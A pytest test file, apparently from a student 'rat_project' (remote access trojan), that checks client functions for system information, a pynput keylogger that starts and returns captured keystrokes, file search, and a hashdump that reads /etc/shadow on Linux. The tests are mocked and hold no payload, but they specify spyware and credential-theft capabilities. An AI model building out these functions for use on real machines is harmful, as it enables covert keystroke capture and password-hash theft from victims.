from unittest.mock import MagicMock, patch

from rat_project.client.client_actions_os import get_system_info, toggle_keylogger
import tempfile
from pathlib import Path

from rat_project.client.client_actions_os import get_system_info, search_file
from unittest.mock import mock_open, patch

from rat_project.client.client_actions_os import get_system_info, hashdump


def test_get_system_info_returns_string() -> None:
    result = get_system_info()

    assert isinstance(result, str)
    assert result != ""


def test_toggle_keylogger_start_returns_confirmation() -> None:
    # Given: keylogger is not running
    import rat_project.client.client_actions_os as actions

    actions._keylogger_listener = None
    actions._keylogger_buffer = []

    with patch("pynput.keyboard.Listener") as mock_listener_class:
        mock_listener = MagicMock()
        mock_listener_class.return_value = mock_listener

        result = toggle_keylogger()

    assert "started" in result.lower()
    mock_listener.start.assert_called_once()


def test_toggle_keylogger_stop_returns_captured_keys() -> None:
    # Given: keylogger is already running with buffered keys
    import rat_project.client.client_actions_os as actions

    mock_listener = MagicMock()
    actions._keylogger_listener = mock_listener
    actions._keylogger_buffer = ["h", "e", "l", "l", "o"]

    result = toggle_keylogger()

    assert "stopped" in result.lower()
    assert "hello" in result
    mock_listener.stop.assert_called_once()
    assert actions._keylogger_listener is None
    assert actions._keylogger_buffer == []
def test_search_file_found() -> None:
    # Crée une fichier temporaire et vérifie qu'on le trouve bien
    with tempfile.NamedTemporaryFile(suffix=".txt", delete=False) as tmp:
        tmp_path = Path(tmp.name)

    result = search_file(tmp_path.name)

    assert tmp_path.name in result
    tmp_path.unlink()


def test_search_file_not_found() -> None:
    result = search_file("fichier_qui_nexiste_vraiment_pas_12345.xyz")

    assert "Aucun fichier trouvé" in result
def test_hashdump_linux_returns_shadow_content() -> None:
    # Given: Linux OS with a reeadable /etc/shadow
    fake_shadow = "root:$6$hash:19000:0:99999:7:::\nuser:$6$hash2:19000:0:99999:7:::\n"

    with patch("rat_project.client.client_actions_os._get_os", return_value="Linux"):
        with patch("builtins.open", mock_open(read_data=fake_shadow)):
            with patch("pathlib.Path.read_text", return_value=fake_shadow):
                result = hashdump()
    assert isinstance(result, str)
    assert "root" in result


def test_hashdump_linux_permission_denied_returns_error() -> None:
    # Given: Linux OS without root privileges
    with patch("rat_project.client.client_actions_os._get_os", return_value="Linux"):
        with patch("pathlib.Path.read_text", side_effect=PermissionError):
            result = hashdump()

    assert isinstance(result, str)
    assert "Error" in result
    assert "permission" in result.lower()
